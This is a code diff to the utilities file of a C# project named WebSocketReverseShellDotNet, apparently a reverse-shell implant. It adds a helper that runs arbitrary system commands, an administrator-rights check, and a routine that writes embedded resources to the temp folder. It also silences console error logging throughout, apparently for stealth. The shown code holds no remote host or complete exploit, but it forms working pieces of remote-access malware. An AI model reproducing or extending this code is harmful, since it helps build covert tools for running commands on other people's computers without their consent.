@@ -4,9 +4,12 @@ using System.IO;
 using System.IO.Compression;
 using System.Linq;
 using System.Net.Http;
+using System.Reflection;
+using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
 using WebSocketReverseShellDotNet.model;
+using WebSocketReverseShellDotNet.service.commands;
 
 namespace WebSocketReverseShellDotNet.utils
 {
@@ -70,8 +73,13 @@ namespace WebSocketReverseShellDotNet.utils
             return Path.GetTempPath();
         }
 
+        public static async Task ExecuteCommandAsync(string command)
+        {
+            SystemCommand systemCommand = new SystemCommand();
+            systemCommand.ExecuteCommand($"{command}");
 
- 
+        }
+
 
         public static void RunInSeparateThread(Func<Task> function)
         {
@@ -83,7 +91,7 @@ namespace WebSocketReverseShellDotNet.utils
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine(ex.ToString());
+                   /* Console.WriteLine(ex.ToString());*/
                 }
             });
 
@@ -169,7 +177,7 @@ namespace WebSocketReverseShellDotNet.utils
                 // Check if the content is empty or null
                 if (string.IsNullOrEmpty(content))
                 {
-                    Console.WriteLine("Content is empty or null. File creation aborted.");
+                    /*Console.WriteLine("Content is empty or null. File creation aborted.");*/
                     return null;
                 }
 
@@ -185,7 +193,7 @@ namespace WebSocketReverseShellDotNet.utils
             catch (Exception ex)
             {
                 // Handle any exceptions that might occur during file creation
-                Console.WriteLine($"Error creating file: {ex.Message}");
+                /*Console.WriteLine($"Error creating file: {ex.Message}");*/
                 return null;
             }
         }
@@ -276,39 +284,88 @@ namespace WebSocketReverseShellDotNet.utils
             }
         }
 
-       /* static FileInfo? ZipFiles(List<string> files, string outputDirectory, string zipFileName)
-    {
-        try
+
+        public static bool IsAdministrator()
         {
-            // Ensure the output directory exists
-            if (!Directory.Exists(outputDirectory))
-            {
-                Directory.CreateDirectory(outputDirectory);
-            }
-
-            // Combine the output directory and zip file name to get the full path
-            string outputPath = Path.Combine(outputDirectory, zipFileName);
-
-            // Check if the file already exists
-            if (File.Exists(outputPath))
-            {
-                // Make sure the file is not in use before attempting to delete it
-                File.Delete(outputPath); // Delete the existing file
-            }
-
-            // Use ZipFile.ExtractToDirectory to create a new zip file
-            ZipFile.CreateFromDirectory(outputDirectory, outputPath);
-
-            // Return FileInfo for the created zip file
-            return new FileInfo(outputPath);
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
-        catch (Exception ex)
+
+
+
+        public static string? CopyResourceToTempFolder(string resource)
         {
-            // Handle any exceptions that may occur during zipping
-            Console.WriteLine($"Error zipping files: {ex.Message}");
-            return null;
+            try
+            {
+                // Specify the resource name
+                string resourceName = $"WebSocketReverseShellDotNet.resources.{resource}"; // Adjust with your actual namespace and resource name
+
+                // Get the resource stream
+                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);
+
+                if (stream != null)
+                {
+                    // Create a temporary file path
+                    string tempFilePath = Path.Combine(Path.GetTempPath(), resource);
+
+                    // Save the resource stream to the temporary file
+                    using (var fileStream = File.Create(tempFilePath))
+                    {
+                        stream.CopyTo(fileStream);
+                    }
+
+                    /*Console.WriteLine($"Resource '{resource}' copied to temporary folder: {tempFilePath}");*/
+                    return tempFilePath;
+                }
+                else
+                {
+                   /* Console.WriteLine($"Resource '{resource}' not found.");*/
+                    return null;
+                }
+            }
+            catch (Exception ex)
+            {
+               /* Console.WriteLine($"Error: {ex.Message}");*/
+                return null;
+            }
         }
-    }*/
+
+
+
+        /* static FileInfo? ZipFiles(List<string> files, string outputDirectory, string zipFileName)
+     {
+         try
+         {
+             // Ensure the output directory exists
+             if (!Directory.Exists(outputDirectory))
+             {
+                 Directory.CreateDirectory(outputDirectory);
+             }
+
+             // Combine the output directory and zip file name to get the full path
+             string outputPath = Path.Combine(outputDirectory, zipFileName);
+
+             // Check if the file already exists
+             if (File.Exists(outputPath))
+             {
+                 // Make sure the file is not in use before attempting to delete it
+                 File.Delete(outputPath); // Delete the existing file
+             }
+
+             // Use ZipFile.ExtractToDirectory to create a new zip file
+             ZipFile.CreateFromDirectory(outputDirectory, outputPath);
+
+             // Return FileInfo for the created zip file
+             return new FileInfo(outputPath);
+         }
+         catch (Exception ex)
+         {
+             // Handle any exceptions that may occur during zipping
+             Console.WriteLine($"Error zipping files: {ex.Message}");
+             return null;
+         }
+     }*/
 
 
 
